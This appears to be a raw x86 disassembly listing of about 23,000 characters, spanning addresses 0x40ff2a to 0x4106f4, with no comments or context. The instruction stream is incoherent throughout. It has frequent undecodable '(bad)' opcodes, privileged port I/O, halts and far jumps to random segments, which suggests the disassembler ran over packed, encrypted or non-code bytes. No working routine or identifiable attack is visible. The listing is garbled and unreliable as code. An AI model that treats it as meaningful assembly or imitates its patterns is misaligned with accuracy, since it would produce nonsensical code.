  40ff2a:	test   BYTE PTR [edi],ch
  40ff2c:	pop    esp
  40ff2d:	or     esp,esp
  40ff2f:	jae    0x4c75687c
  40ff35:	mov    ebp,0x529f6169
  40ff3a:	add    eax,0xce15bd15
  40ff3f:	jns    0x40fece
  40ff41:	mov    ah,0x5a
  40ff43:	cs sbb eax,0x98db3728
  40ff49:	mov    ecx,0x5a570bd1
  40ff4e:	pop    esi
  40ff4f:	xchg   edi,eax
  40ff50:	mov    WORD PTR [ecx+0x51],gs
  40ff53:	jmp    0xded6:0x5307ca75
  40ff5a:	aaa    
  40ff5b:	cmp    BYTE PTR [esi],al
  40ff5d:	(bad)  
  40ff5e:	jl     0x40ff7d
  40ff60:	mov    DWORD PTR [edi],ebx
  40ff62:	dec    esi
  40ff63:	ret    0xc1a5
  40ff66:	jge    0x40ff09
  40ff68:	mov    bl,0xbf
  40ff6a:	xchg   ebx,eax
  40ff6b:	aam    0x68
  40ff6d:	mov    BYTE PTR [esi+0x62],al
  40ff70:	sub    al,0x53
  40ff72:	inc    DWORD PTR [ebx]
  40ff74:	scas   al,BYTE PTR es:[edi]
  40ff75:	pop    ds
  40ff76:	and    ebp,DWORD PTR [ecx+0x46]
  40ff79:	jmp    0x7e522fec
  40ff7e:	idiv   DWORD PTR [ebx+esi*4]
  40ff81:	pop    edx
  40ff82:	fsub   QWORD PTR [edi]
  40ff84:	jp     0x40ff13
  40ff86:	cmp    al,0x71
  40ff88:	sbb    DWORD PTR [ebp+0x3805bdea],edi
  40ff8e:	inc    edx
  40ff8f:	sub    BYTE PTR [ebp-0x45c0fd2a],dh
  40ff95:	jge    0x410003
  40ff97:	push   edx
  40ff98:	mov    al,BYTE PTR [ebp+0x7b]
  40ff9b:	push   esp
  40ff9c:	mov    ah,BYTE PTR [edx-0x8]
  40ff9f:	and    BYTE PTR [ebp+0x51],dh
  40ffa2:	retf   0x78c3
  40ffa5:	lea    esi,[esi]
  40ffa7:	push   ds
  40ffa8:	mov    WORD PTR [ebx+0x44],fs
  40ffab:	adc    eax,0xe271190f
  40ffb0:	push   0x3a960b4f
  40ffb5:	jge    0x40fff3
  40ffb7:	dec    edi
  40ffb8:	sbb    DWORD PTR [edx-0x33c19f21],ebx
  40ffbe:	sub    DWORD PTR [edx],0x6b
  40ffc1:	dec    esi
  40ffc2:	inc    ecx
  40ffc3:	mov    ch,0x12
  40ffc5:	int3   
  40ffc6:	add    BYTE PTR [ebx+0x2b],al
  40ffc9:	sar    eax,1
  40ffcb:	jne    0x40ff58
  40ffcd:	adc    BYTE PTR [eax],dh
  40ffcf:	mov    edi,0x33526e20
  40ffd4:	pop    ss
  40ffd5:	mov    eax,0x6472da0f
  40ffda:	fucomp st(5)
  40ffdc:	dec    ebx
  40ffdd:	push   esp
  40ffde:	test   cl,0x38
  40ffe1:	rcr    cl,0x5e
  40ffe4:	jp     0x410001
  40ffe6:	dec    esi
  40ffe7:	jo     0x410051
  40ffe9:	cs leave 
  40ffeb:	pusha  
  40ffec:	pop    ebp
  40ffed:	mov    ebp,0x4b29a11a
  40fff2:	nop
  40fff3:	clc    
  40fff4:	inc    ecx
  40fff5:	sti    
  40fff6:	out    dx,eax
  40fff7:	dec    ecx
  40fff8:	pop    ebp
  40fff9:	jns    0x40ff86
  40fffb:	xor    edx,DWORD PTR [ebx+0x3a]
  40fffe:	fcom   st(1)
  410000:	mov    eax,0x4b372686
  410005:	cmp    esi,DWORD PTR [eax-0x4f]
  410008:	adc    ebp,DWORD PTR [edx+0x20]
  41000b:	and    eax,0x9c8c39a8
  410010:	ret    0xb99f
  410013:	pop    ecx
  410014:	cmp    eax,0xc72f0b68
  410019:	mov    ds,WORD PTR [esi-0x4f]
  41001c:	fxam   
  41001e:	stc    
  41001f:	mov    DWORD PTR [ebp-0x1d],ecx
  410022:	push   ebp
  410023:	sbb    BYTE PTR [edi+0x10f27279],0x4f
  41002a:	sbb    ecx,DWORD PTR [eax+0x3d]
  41002d:	(bad)  
  41002e:	repnz lods eax,DWORD PTR ds:[esi]
  410030:	retf   0xb98e
  410033:	and    edx,edx
  410035:	push   edi
  410036:	pop    eax
  410037:	rcl    al,1
  410039:	into   
  41003a:	jmp    0x5e5:0xef236295
  410041:	adc    eax,0x252e317d
  410046:	fmul   st,st(1)
  410048:	ror    WORD PTR [ebx+0x59],1
  41004c:	add    esp,DWORD PTR [ebx-0x19e8718a]
  410052:	pusha  
  410053:	call   0xfb94df5b
  410058:	lds    edi,FWORD PTR [esp+ebp*2+0x2b575f4e]
  41005f:	or     BYTE PTR [ecx+0x4a9e598d],cl
  410065:	push   0x9ebfdaab
  41006a:	or     cl,al
  41006c:	scas   eax,DWORD PTR es:[edi]
  41006d:	scas   al,BYTE PTR es:[edi]
  41006e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41006f:	or     BYTE PTR [ecx],bh
  410071:	sahf   
  410072:	inc    esi
  410073:	into   
  410074:	pop    edi
  410075:	ror    DWORD PTR [ebp-0x2d],0xa8
  410079:	and    eax,0x8ea37a58
  41007e:	js     0x41007b
  410080:	sbb    DWORD PTR [ebx+0x19],ebx
  410083:	aas    
  410084:	xchg   esp,eax
  410085:	mov    ah,BYTE PTR [edi+0x41]
  410088:	adc    esi,DWORD PTR [eax+0x4d32f4b1]
  41008e:	push   edi
  41008f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410090:	leave  
  410091:	int3   
  410092:	xor    ch,BYTE PTR [ecx]
  410094:	fld    DWORD PTR [edi]
  410096:	imul   esi,DWORD PTR [ebx],0x8ca8a533
  41009c:	scas   al,BYTE PTR es:[edi]
  41009d:	pop    esp
  41009e:	jne    0x410073
  4100a0:	arpl   WORD PTR [ecx+esi*4],ax
  4100a3:	sbb    eax,0xf1b51904
  4100a9:	xor    BYTE PTR [esi],ch
  4100ab:	scas   al,BYTE PTR es:[edi]
  4100ac:	(bad)  
  4100ad:	sahf   
  4100ae:	pushf  
  4100af:	sub    bh,BYTE PTR [edi-0x1b]
  4100b2:	or     DWORD PTR [ebx-0x5b],ebx
  4100b5:	push   cs
  4100b6:	shl    DWORD PTR [edi-0x3f],cl
  4100b9:	inc    ebp
  4100ba:	(bad)
  4100bd:	cmp    ebx,DWORD PTR [ecx+0x201af98f]
  4100c3:	push   0x8e3d7c79
  4100c8:	pusha  
  4100c9:	pop    eax
  4100ca:	sub    al,0xcf
  4100cc:	sub    DWORD PTR [ecx],edx
  4100ce:	add    al,0x6
  4100d0:	jnp    0x4100b8
  4100d2:	push   ecx
  4100d3:	cmp    cl,cl
  4100d5:	cmp    bh,BYTE PTR [ebp-0x232fb04]
  4100db:	lahf   
  4100dc:	fs pusha 
  4100de:	sti    
  4100df:	xchg   esi,eax
  4100e0:	in     eax,0x46
  4100e2:	je     0x4100b2
  4100e4:	cdq    
  4100e5:	or     al,0xc6
  4100e7:	bound  ebx,QWORD PTR [eax]
  4100e9:	mov    al,0x82
  4100eb:	mov    eax,ds:0xa89a7a32
  4100f0:	cli    
  4100f1:	(bad)  
  4100f2:	out    0xa7,al
  4100f4:	mov    dh,0x7
  4100f6:	or     ebx,ebp
  4100f8:	js     0x4100c7
  4100fa:	and    al,0x89
  4100fc:	test   al,0x5f
  4100fe:	cmp    eax,0x7ad1b4f0
  410103:	xor    DWORD PTR [edx+0x10619722],ebp
  410109:	das    
  41010a:	add    ebx,DWORD PTR [ebp+edi*2-0x18544265]
  410111:	arpl   WORD PTR [ecx],bp
  410113:	sub    BYTE PTR [ebp+0x475aecd5],al
  410119:	dec    esp
  41011a:	cmp    ebp,DWORD PTR [edx]
  41011c:	icebp  
  41011d:	sti    
  41011e:	sub    edx,DWORD PTR [esp+ecx*4-0x48]
  410122:	test   eax,0x9c485fbe
  410127:	xor    al,0x20
  410129:	popf   
  41012a:	pop    edi
  41012b:	imul   ebx,DWORD PTR [esp+edi*8+0x4],0xa8e4a9eb
  410133:	mov    ch,0xb5
  410135:	mov    ecx,0xd84a6dfc
  41013a:	sub    al,0x87
  41013c:	js     0x41016e
  41013e:	pop    ebx
  41013f:	or     al,0x14
  410141:	or     al,0xa5
  410143:	repnz shl DWORD PTR [esi],1
  410146:	xor    esi,esp
  410148:	cmp    bh,BYTE PTR [edi]
  41014a:	data16 mov dl,0xeb
  41014d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41014e:	add    al,0xd2
  410150:	mov    esi,0xa1b8b7d2
  410155:	dec    edx
  410156:	out    0xa0,al
  410158:	pop    ebp
  410159:	adc    BYTE PTR [esp+esi*4-0x42],0x58
  41015e:	in     eax,0x58
  410160:	fcmovb st,st(6)
  410162:	mov    ds:0x32e57ef4,al
  410167:	sahf   
  410168:	gs push ebp
  41016a:	xor    eax,0xab2415f
  41016f:	xor    DWORD PTR [ebx+0x77c432c9],esp
  410175:	addr16 ret 
  410177:	adc    ah,ch
  410179:	aas    
  41017a:	mov    dl,0x1d
  41017c:	outs   dx,BYTE PTR ds:[esi]
  41017d:	in     eax,0x8f
  41017f:	icebp  
  410180:	call   0x3ed0ff2c
  410185:	fld1   
  410187:	fidivr DWORD PTR [edx-0x49]
  41018a:	comiss xmm5,DWORD PTR [ebp+0x30]
  41018e:	ja     0x4101ff
  410190:	inc    ebp
  410191:	sar    dl,1
  410193:	out    0x57,eax
  410195:	(bad)  
  410197:	cmp    al,0x6a
  410199:	enter  0x6511,0xfc
  41019d:	je     0x4101a0
  41019f:	mov    al,ds:0xa0878ee1
  4101a4:	jne    0x41021e
  4101a6:	adc    al,BYTE PTR [ebx+0x26eed174]
  4101ac:	add    DWORD PTR [ecx+eiz*4-0xa],0x24
  4101b1:	arpl   WORD PTR ds:0x51c67a53,bp
  4101b7:	(bad)  
  4101b8:	fbstp  TBYTE PTR [edx]
  4101ba:	fsub   DWORD PTR [edi+0x16753122]
  4101c0:	push   esi
  4101c1:	test   eax,0x718f8d69
  4101c6:	out    0x12,eax
  4101c8:	out    0x90,al
  4101ca:	aaa    
  4101cb:	jle    0x4101a9
  4101cd:	sbb    al,0x48
  4101cf:	sbb    eax,0x88e26501
  4101d4:	jnp    0x410226
  4101d6:	les    esi,FWORD PTR ds:0xd3a55e6e
  4101dc:	mov    eax,0x5aefdaca
  4101e1:	xor    ah,BYTE PTR [edx]
  4101e3:	adc    ch,bl
  4101e5:	jns    0x4101d2
  4101e7:	hlt    
  4101e8:	mov    al,ds:0x72de3d5b
  4101ed:	inc    ecx
  4101ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101ef:	sbb    dh,dh
  4101f1:	das    
  4101f2:	lock outs dx,DWORD PTR ds:[esi]
  4101f4:	imul   esp,DWORD PTR [edx+0x215d5a24],0xe16c65fd
  4101fe:	dec    eax
  4101ff:	xlat   BYTE PTR ds:[ebx]
  410200:	dec    esp
  410201:	jno    0x410202
  410203:	sub    bl,BYTE PTR ds:0x962b6b62
  410209:	fcmovnu st,st(1)
  41020b:	sti    
  41020c:	add    ebp,edi
  41020e:	xchg   ecx,eax
  41020f:	inc    ebp
  410210:	test   ch,ch
  410212:	push   0x46dd1be6
  410217:	clc    
  410218:	add    al,0x5f
  41021a:	push   edi
  41021b:	dec    esp
  41021c:	push   ebx
  41021d:	stos   DWORD PTR es:[edi],eax
  41021e:	sbb    BYTE PTR [edx-0x78341edc],cl
  410224:	dec    ebx
  410225:	and    bl,dh
  410227:	push   0x387b3826
  41022c:	xor    BYTE PTR [eax-0xca84763],0x95
  410233:	mov    ah,0x89
  410235:	jnp    0x410292
  410237:	mov    al,0x8f
  410239:	sub    eax,0xcce9dee9
  41023e:	aaa    
  41023f:	popf   
  410240:	mov    bh,0x62
  410242:	out    dx,al
  410243:	data16 js 0x4102a7
  410246:	mov    ecx,0x570df525
  41024b:	call   0xbfad:0xeecd072b
  410252:	push   ss
  410253:	adc    al,BYTE PTR [edx+ebp*1]
  410256:	loop   0x41020e
  410258:	retf   
  410259:	and    cl,bl
  41025b:	xchg   ebp,eax
  41025c:	push   ebp
  41025d:	push   DWORD PTR [ebp+0xc]
  410260:	sti    
  410261:	test   al,0xe9
  410263:	(bad)  
  410265:	lds    eax,FWORD PTR ds:0xa7dc410a
  41026b:	bound  ebp,QWORD PTR [si-0x78]
  41026f:	push   esp
  410270:	rcl    BYTE PTR ds:0xd855f6e0,cl
  410276:	push   esi
  410277:	stos   DWORD PTR es:[edi],eax
  410278:	mov    ah,0x79
  41027a:	jmp    0x4102c6
  41027c:	dec    ebx
  41027d:	jno    0x410258
  41027f:	mov    al,0x48
  410281:	push   ebp
  410282:	xor    ecx,edx
  410284:	xchg   esp,edi
  410286:	pusha  
  410287:	xchg   DWORD PTR ds:0xeb787f49,ecx
  41028d:	push   ss
  41028e:	arpl   WORD PTR ds:0x129afd75,di
  410294:	(bad)  
  410295:	pop    ss
  410296:	cmp    DWORD PTR [edi+0x4c],edi
  410299:	inc    esi
  41029a:	cdq    
  41029b:	repz sbb eax,0x17533cde
  4102a1:	js     0x41028f
  4102a3:	adc    al,BYTE PTR [ebx-0x27a2444a]
  4102a9:	jnp    0x4102f8
  4102ab:	mov    bh,0xc3
  4102ad:	and    al,0xfd
  4102af:	dec    eax
  4102b0:	aaa    
  4102b1:	retf   
  4102b2:	dec    eax
  4102b3:	adc    DWORD PTR [edi-0x10],0xfffffff6
  4102b7:	ds mov edi,0x57e9038e
  4102bd:	push   esi
  4102be:	adc    edi,ecx
  4102c0:	cs nop
  4102c2:	push   ebx
  4102c3:	fisttp WORD PTR [eax]
  4102c5:	mov    al,BYTE PTR [ecx+eiz*2]
  4102c8:	dec    edx
  4102c9:	or     eax,0xe37eec4
  4102ce:	shl    BYTE PTR [edx],0x41
  4102d1:	sub    eax,DWORD PTR [edx-0x7585eb1a]
  4102d7:	ins    DWORD PTR es:[edi],dx
  4102d8:	pusha  
  4102d9:	cmp    al,0xff
  4102db:	and    BYTE PTR [edx-0x74071c4b],ch
  4102e1:	lock fadd st(2),st
  4102e4:	ror    DWORD PTR gs:[eax],1
  4102e7:	pavgb  mm1,QWORD PTR [esp+edx*1-0xb109219]
  4102ef:	in     eax,dx
  4102f0:	mov    eax,ds:0x60a8f66a
  4102f5:	push   edx
  4102f6:	pop    esi
  4102f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102f8:	pop    eax
  4102f9:	into   
  4102fa:	and    eax,0x8e22993d
  4102ff:	xor    al,BYTE PTR [ecx]
  410301:	push   esp
  410302:	repz mov ch,0xaf
  410305:	inc    ebp
  410306:	in     eax,0x7a
  410308:	pop    ebx
  410309:	mov    ah,0x73
  41030b:	xlat   BYTE PTR cs:[ebx]
  41030d:	adc    eax,0x8030cec4
  410312:	mov    bh,0xc1
  410314:	mov    ds:0xe2d0a53f,eax
  410319:	(bad)  
  41031b:	adc    eax,0xc4d14b41
  410320:	pushf  
  410321:	xor    eax,0x393abaf4
  410326:	hlt    
  410327:	imul   ecx,DWORD PTR ds:0xcce0f255,0xffffffaf
  41032e:	adc    al,0x56
  410330:	data16 add bl,BYTE PTR [eax+edi*1+0x6b96ca9e]
  410338:	add    eax,0xaec0f7fd
  41033d:	inc    ebp
  41033e:	cdq    
  41033f:	add    BYTE PTR [esi],ch
  410341:	(bad)  
  410342:	loope  0x4103c3
  410344:	sbb    BYTE PTR [esi-0x7f],ah
  410347:	sub    bl,BYTE PTR [ebp+0x65]
  41034a:	sub    eax,0xb53e8654
  41034f:	popf   
  410350:	fnstcw WORD PTR [edi-0x1830fec8]
  410356:	(bad)  
  410357:	adc    eax,0x955bef83
  41035c:	push   es
  41035d:	push   edi
  41035e:	enter  0x5b8,0xd4
  410362:	fistp  WORD PTR [ebx]
  410364:	mov    WORD PTR [ebp+0x41b5a10d],es
  41036a:	pop    eax
  41036b:	(bad)
  410370:	xchg   edi,eax
  410371:	into   
  410372:	daa    
  410373:	jge    0x410300
  410375:	mov    ecx,0x2195a552
  41037a:	push   0x1e3467fe
  41037f:	and    DWORD PTR [esi+esi*2],eax
  410382:	scas   al,BYTE PTR es:[edi]
  410383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410384:	mov    ecx,ecx
  410386:	stc    
  410387:	and    eax,0x326421d1
  41038c:	popf   
  41038d:	push   ebp
  41038e:	or     DWORD PTR [ecx],esp
  410390:	sahf   
  410391:	loopne 0x4103a2
  410393:	add    al,0x21
  410395:	pop    eax
  410396:	mov    BYTE PTR [edi+0x72],cl
  410399:	xor    BYTE PTR fs:[edi+0x54],0xe2
  41039e:	jle    0x410324
  4103a0:	outs   dx,BYTE PTR ds:[esi]
  4103a1:	xchg   ebp,eax
  4103a2:	addr16 cli 
  4103a4:	push   ebx
  4103a5:	mov    ebx,ss
  4103a7:	retf   0x55b
  4103aa:	sbb    al,0xda
  4103ac:	or     al,0x7a
  4103ae:	sub    esp,ebx
  4103b0:	not    ecx
  4103b2:	ficom  WORD PTR [esp+eax*8-0x732d0de3]
  4103b9:	adc    DWORD PTR [ecx-0x45],esp
  4103bc:	das    
  4103bd:	jecxz  0x410423
  4103bf:	or     DWORD PTR [esi+0x6c7bc93d],esp
  4103c5:	iret   
  4103c6:	push   0x9
  4103c8:	adc    ebx,DWORD PTR [bp+si+0x48d]
  4103cd:	ins    DWORD PTR es:[edi],dx
  4103ce:	inc    edi
  4103cf:	sbb    edi,edi
  4103d1:	xchg   ecx,eax
  4103d2:	jmp    0x4103f5
  4103d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103d5:	push   eax
  4103d6:	ds into 
  4103d8:	jo     0x4103c3
  4103da:	rcl    DWORD PTR [esi+0x6a288d83],cl
  4103e0:	push   eax
  4103e1:	inc    ebx
  4103e2:	imul   edx,esp,0xffffffef
  4103e5:	sahf   
  4103e6:	retf   0xe4d7
  4103e9:	or     BYTE PTR [ecx+0x19],dh
  4103ec:	mov    ebx,0xd8c238f
  4103f1:	pop    esp
  4103f2:	cmp    cl,BYTE PTR [ecx-0x36]
  4103f5:	jp     0x4103e8
  4103f7:	or     bl,BYTE PTR [esi]
  4103f9:	inc    ebp
  4103fa:	mov    esi,0x886c32f4
  4103ff:	fisubr DWORD PTR ds:0x59f5b10e
  410405:	mov    ch,0xbc
  410407:	std    
  410408:	add    eax,0x185e7914
  41040d:	lds    ebx,FWORD PTR [esi-0x6b]
  410410:	int    0x98
  410412:	pop    ecx
  410413:	xor    DWORD PTR [edi],edi
  410415:	arpl   WORD PTR [edi-0x1],dx
  410418:	xchg   ecx,eax
  410419:	adc    ah,dh
  41041b:	push   es
  41041c:	add    DWORD PTR [ebp-0x4e],0xffffff83
  410420:	and    ebx,DWORD PTR [edi]
  410422:	dec    esi
  410423:	inc    esi
  410424:	or     al,0x6b
  410426:	and    BYTE PTR [edi+0x6f9f6708],ch
  41042c:	xchg   ebx,eax
  41042d:	jbe    0x41044a
  41042f:	aaa    
  410430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410431:	push   ebx
  410432:	xor    esi,esi
  410434:	sbb    eax,0x385c0407
  410439:	fwait
  41043a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41043b:	int    0xe5
  41043d:	nop
  41043e:	lock sub BYTE PTR [edx+0x59],dh
  410442:	les    eax,FWORD PTR [edx-0x52459c8c]
  410448:	push   esp
  410449:	jns    0x4103eb
  41044b:	arpl   WORD PTR [ecx],di
  41044d:	sbb    BYTE PTR [ebp+0x64ac104f],dl
  410453:	xchg   ebp,eax
  410454:	std    
  410455:	in     al,dx
  410456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410457:	call   0xc64ddcda
  41045c:	pshufw mm1,QWORD PTR [esp+esi*2],0xb3
  410461:	xchg   dh,al
  410463:	mov    esp,0x8e35d93b
  410468:	fst    st(3)
  41046a:	ins    DWORD PTR es:[edi],dx
  41046b:	xor    al,0xc3
  41046d:	outs   dx,DWORD PTR ds:[esi]
  41046e:	shl    DWORD PTR [edi+0x4eb9d222],cl
  410474:	mov    ebx,0x748ca41e
  410479:	jmp    0x41046e
  41047b:	in     eax,dx
  41047c:	scas   eax,DWORD PTR es:[edi]
  41047d:	mov    bh,0xa3
  41047f:	sti    
  410480:	inc    eax
  410481:	rcr    DWORD PTR [ebx-0x5d],0xba
  410485:	pop    esi
  410486:	fwait
  410487:	add    dh,dh
  410489:	shr    BYTE PTR [ebp+0x39],cl
  41048c:	mov    al,0xa1
  41048e:	stos   BYTE PTR es:[edi],al
  41048f:	push   0x3d3d3dfd
  410494:	dec    esp
  410495:	push   0x5d5af574
  41049a:	loopne 0x410446
  41049c:	jecxz  0x410434
  41049e:	popf   
  41049f:	mov    ah,BYTE PTR [edx+0x1f042fc2]
  4104a5:	fs jmp 0x8d7635dd
  4104ab:	leave  
  4104ac:	adc    al,0xe8
  4104ae:	cwde   
  4104af:	push   es
  4104b0:	mov    ch,0x29
  4104b2:	xor    al,0x99
  4104b4:	jmp    0x5f36:0x4cb6458a
  4104bb:	jecxz  0x410499
  4104bd:	add    ebp,esp
  4104bf:	push   0x4d40affb
  4104c4:	jae    0x410492
  4104c6:	mov    edx,0x611d60f7
  4104cb:	inc    edi
  4104cc:	loop   0x4104bf
  4104ce:	dec    esi
  4104cf:	int3   
  4104d0:	mov    esp,0x46815d5a
  4104d5:	push   edi
  4104d6:	out    dx,al
  4104d7:	pop    ebx
  4104d8:	(bad)  
  4104da:	sub    al,0x8a
  4104dc:	call   0x80cc:0x238e3488
  4104e3:	mov    dh,0xe9
  4104e5:	and    BYTE PTR [ebx],ah
  4104e7:	(bad)  
  4104e8:	aad    0x63
  4104ea:	push   cs
  4104eb:	add    eax,0xfad01050
  4104f0:	int    0x56
  4104f2:	pop    eax
  4104f3:	fcom   DWORD PTR [ebp+0x28c17cfe]
  4104f9:	stos   DWORD PTR es:[edi],eax
  4104fa:	xor    al,BYTE PTR [edx-0x6df98ae8]
  410500:	cs add al,0xff
  410503:	mov    dl,0x6f
  410505:	xchg   ebx,eax
  410506:	pop    es
  410507:	mov    edx,esi
  410509:	adc    BYTE PTR [edx+eax*2],0xee
  41050d:	sbb    dl,ah
  41050f:	push   0xffffffce
  410511:	adc    al,0xd7
  410513:	xchg   DWORD PTR [eax-0x1521c81c],esi
  410519:	xchg   ebp,eax
  41051a:	inc    esp
  41051b:	aam    0xe4
  41051d:	in     eax,0xe8
  41051f:	jns    0x41056c
  410521:	popa   
  410522:	jb     0x410529
  410524:	xor    al,0x6e
  410526:	imul   ebp,ebp,0x31
  410529:	jbe    0x4104be
  41052b:	mov    cs,esp
  41052d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41052e:	add    DWORD PTR [ebx+0x2d1d50b7],0xab9dccd5
  410538:	inc    ecx
  410539:	nop
  41053a:	add    eax,0xfcff92be
  41053f:	lahf   
  410540:	pop    ecx
  410541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410542:	fisttp WORD PTR [ebp+0xcf601ab]
  410548:	push   ebp
  410549:	xchg   ebp,eax
  41054a:	in     eax,dx
  41054b:	adc    edi,esi
  41054d:	(bad)  
  41054e:	shl    BYTE PTR [ebp+esi*8-0x34f779f7],1
  410555:	arpl   WORD PTR [ecx-0x55],bp
  410558:	inc    eax
  410559:	inc    edx
  41055a:	mov    BYTE PTR [edi-0x52e9ac2e],al
  410560:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410561:	rol    BYTE PTR [edi+0x1b],cl
  410564:	mov    bh,0x92
  410566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410567:	out    dx,al
  410568:	mov    al,ds:0xcae296cb
  41056d:	mov    ebp,0x29290a1b
  410572:	or     DWORD PTR [edi-0x58],edi
  410575:	icebp  
  410576:	mov    bh,0xbd
  410578:	dec    ebx
  410579:	pop    ebx
  41057a:	xchg   esi,eax
  41057b:	arpl   WORD PTR [ebx],si
  41057d:	gs cli 
  41057f:	mov    bl,0x5d
  410581:	xchg   edi,eax
  410582:	inc    esp
  410583:	add    DWORD PTR [eax-0x7b],ecx
  410586:	cpuid  
  410588:	jne    0x410511
  41058a:	ret    0x1d31
  41058d:	jmp    0x4105d3
  41058f:	js     0x41054c
  410591:	(bad)  
  410592:	arpl   WORD PTR [esi-0x1127bd65],sp
  410598:	mov    esi,DWORD PTR [edi-0x41]
  41059b:	gs cli 
  41059d:	xor    DWORD PTR [ecx],ebp
  41059f:	call   0x9f28:0x2cfdc102
  4105a6:	xchg   ebp,eax
  4105a7:	push   ss
  4105a8:	repz adc ecx,DWORD PTR [ebx+0x1e]
  4105ac:	jnp    0x41058a
  4105ae:	jmp    0x46b5:0x23c163ab
  4105b5:	mov    es,ecx
  4105b7:	icebp  
  4105b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105b9:	enter  0xcfe1,0xa1
  4105bd:	inc    ebx
  4105be:	mov    fs,WORD PTR [eax]
  4105c0:	sbb    al,0x8a
  4105c2:	xchg   DWORD PTR [esi+0x21],edi
  4105c5:	scas   eax,DWORD PTR es:[edi]
  4105c6:	and    bh,dl
  4105c8:	jae    0x41063a
  4105ca:	mov    ds,WORD PTR [ecx]
  4105cc:	pop    esp
  4105cd:	(bad)  
  4105ce:	enter  0xda73,0x14
  4105d2:	push   edi
  4105d3:	bound  edx,QWORD PTR [edx+0x3e9c512d]
  4105d9:	(bad)  
  4105da:	mov    al,0xef
  4105dc:	into   
  4105dd:	dec    edi
  4105de:	int    0x7d
  4105e0:	jle    0x41056b
  4105e2:	fwait
  4105e3:	mov    eax,0x88e428ba
  4105e8:	shl    DWORD PTR [ebx-0x1e],1
  4105eb:	lea    edx,[edx]
  4105ed:	test   al,0x80
  4105ef:	fsub   DWORD PTR [edi+0x42]
  4105f2:	mov    ?,WORD PTR [eax]
  4105f4:	daa    
  4105f5:	and    al,0xa4
  4105f7:	test   DWORD PTR [esp+eax*4],0x2cd4b16c
  4105fe:	retf   0xf7b8
  410601:	daa    
  410602:	sub    eax,0xbb2e973d
  410607:	pop    ebx
  410608:	sbb    DWORD PTR [esp+eiz*8-0xc],esp
  41060c:	add    eax,DWORD PTR ds:0x71512448
  410612:	mov    es,WORD PTR [esi+edi*2]
  410615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410616:	jecxz  0x41068b
  410618:	imul   si,WORD PTR [esi+edi*2-0x9],0x37bc
  41061f:	inc    ecx
  410620:	fiadd  WORD PTR [esi]
  410622:	mov    al,0x1d
  410624:	(bad)  
  410626:	mov    edx,0x2b58421d
  41062b:	pop    ebx
  41062c:	jbe    0x410639
  41062e:	lods   eax,DWORD PTR ds:[esi]
  41062f:	rcr    edi,1
  410631:	inc    eax
  410632:	sub    esp,esi
  410634:	lods   al,BYTE PTR ds:[esi]
  410635:	xchg   DWORD PTR [edi],ebx
  410637:	test   eax,0x900b44a3
  41063c:	xchg   esp,eax
  41063d:	fsubr  st,st(1)
  41063f:	mov    ds:0x1e519a9d,eax
  410644:	push   ds
  410645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410646:	cmp    eax,0x694a358c
  41064b:	pushf  
  41064c:	push   ebp
  41064d:	mov    DWORD PTR [edi+0x35ec7c2b],ecx
  410653:	test   al,0x2
  410655:	outs   dx,BYTE PTR ds:[esi]
  410656:	jno    0x410633
  410658:	jl     0x4105df
  41065a:	lea    edx,[ecx+0x7227a835]
  410660:	mov    edx,0xe9ee7cd9
  410665:	jg     0x4106d1
  410667:	or     al,0x15
  410669:	stos   DWORD PTR es:[edi],eax
  41066a:	pusha  
  41066b:	pop    ecx
  41066c:	test   DWORD PTR [edx-0x37],ebp
  41066f:	es pusha 
  410671:	hlt    
  410672:	hlt    
  410673:	in     eax,0x8f
  410675:	test   dh,dh
  410677:	inc    esi
  410678:	adc    DWORD PTR [edi-0x31],esi
  41067b:	stc    
  41067c:	lock mov al,0x72
  41067f:	xor    cl,BYTE PTR [ebx-0x7357a395]
  410685:	nop
  410686:	sub    DWORD PTR [ecx+edi*8],ebx
  410689:	(bad)  
  41068a:	cmp    edi,DWORD PTR [edx]
  41068c:	pop    es
  41068d:	lods   eax,DWORD PTR ds:[esi]
  41068e:	cli    
  41068f:	adc    bl,al
  410691:	dec    esi
  410692:	(bad)  
  410693:	and    ch,BYTE PTR [ebp-0x66b55475]
  410699:	jae    0x410634
  41069b:	add    dh,dh
  41069d:	and    eax,0xca51ec1b
  4106a2:	push   edx
  4106a3:	xchg   esp,eax
  4106a4:	cli    
  4106a5:	std    
  4106a6:	inc    edx
  4106a7:	mov    al,ds:0x634d84a0
  4106ac:	ror    ecx,cl
  4106ae:	leave  
  4106af:	icebp  
  4106b0:	push   eax
  4106b1:	repz and al,0xf5
  4106b4:	mov    bl,0x46
  4106b6:	adc    BYTE PTR [eax],dh
  4106b8:	in     eax,0x64
  4106ba:	mov    ah,BYTE PTR [esi-0x47]
  4106bd:	xchg   ecx,eax
  4106be:	sbb    eax,0xbda0612a
  4106c3:	push   ebp
  4106c4:	pop    ss
  4106c5:	(bad)  [esi-0x622fd26f]
  4106cb:	xor    DWORD PTR [eax-0x52a65ae9],edx
  4106d1:	sti    
  4106d2:	popa   
  4106d3:	shl    DWORD PTR [ebx],0xf8
  4106d6:	push   DWORD PTR [edi+0x39]
  4106d9:	lods   eax,DWORD PTR ds:[esi]
  4106da:	mov    edx,0x676b138
  4106df:	push   0x78
  4106e1:	xor    eax,esp
  4106e3:	sbb    DWORD PTR [eax],ebx
  4106e5:	adc    DWORD PTR [eax+esi*2+0x640728e9],eax
  4106ec:	mov    ch,0xbb
  4106ee:	(bad)  
  4106ef:	pop    ebp
  4106f0:	ret    
  4106f1:	pop    ss
  4106f2:	mov    cl,0xf8
  4106f4:	cmp    al,0xdd
